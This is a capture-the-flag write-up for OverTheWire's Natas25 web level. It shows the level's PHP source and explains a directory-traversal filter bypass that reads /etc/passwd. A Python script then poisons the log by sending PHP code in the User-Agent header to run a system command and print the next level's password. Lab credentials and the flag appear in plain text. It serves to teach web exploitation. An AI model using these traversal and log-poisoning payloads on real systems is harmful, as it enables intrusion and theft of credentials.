# CTF Writeup - **OverTheWire Natas24- Natas25**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas24 - Natas25
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 07-01-2025

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using type juggling.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
URL:      http://natas25.natas.labs.overthewire.org
```

After logging in, we can see that the webpage displays a quote where we can change language. As we dont know anything about it lets try change the language. 

```bash
Quote

You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.

Scientist, Bad Boy Bubby

```

So, For this level we need to change it to correct language since this is the only input we can change. Lets view the source code if there is anything to exploit.

```bash
<?php

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

We can see that there is a form which takes the `lang` value as input searches the fileystem for the file contents and tries to display the contents using `safeinclude` function. This is interesting as we need something to display the password, we need to note that the directory travesal is being checked and the password directory as also being checked in the function. We can also see that everything can be seen in the `/var/www/natas/natas25/logs/natas25_PHPSESSID.log` log file. Lets try inputting `../../../../../../` if we input this for `lang` we wont see any change in the webpage because the `../`  is being replaced and this is logged in the `PHPSESSID` log file. Lets exploit this by using `..././` if we input this then the resulting string after removing `../` will be `../`. So Lets use `..././..././..././..././..././..././etc/passwd`.

```bash
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# sys:x:3:3:sys:/dev:/usr/sbin/nologin
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

Since its printing all the data we are able to exploit it. But still we cannot get the password because directory traversal for `natas_webpass` is being checked. So Lets check the log file if we can get anything from it using the exploit with `..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_PHPSESSID.log`. From the source code we can see that the `HTML_USER_AGENT` is being logged in the log file as shown below.

```bash
[07.01.2025 18::59:10] python-requests/2.32.3 "Directory traversal attempt! fixing request."
```

We know that we are requesting the above using the below program and we can also change the HTML_USER_AGENT as shown below to exploit it to use `php` as the html user agent and when the php is being executed to write the log file it will fetch the contents of the password for us as shown below. 

```bash
import requests

target = 'http://natas25.natas.labs.overthewire.org'
auth = ('natas25','ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')
session = requests.Session()

headers = {'User-Agent': '<?php system("cat /etc/natas_webpass/natas26"); ?>'}

r = session.get(target, auth=auth)

r = session.post(target, headers=headers, data={'lang': "..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + r.cookies['PHPSESSID']+ ".log"}, auth=auth)
print(r.text)
```

The above script creates a session first with a request. It sends out a get request to get the session `ID`. The python code will send out a post request using the same session but also including `User-Agent` Header as well as `lang` parameter. This will print the password in the log file for us and display it as shown below.

```bash
# [07.01.2025 19::01:25] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
#  "Directory traversal attempt! fixing request."
# <br />
# <b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
# <h2></h2><br />
# <b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
# <p align="justify"><br />
# <b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
# <div align="right"><h6></h6><div><p>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
```


## Flag

**Flag:** cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE


---

## Lessons Learned

It was a bit a learning challenge for me. I was got the idea that we need to exploit the language request, but couldnt fully figure out the logic. 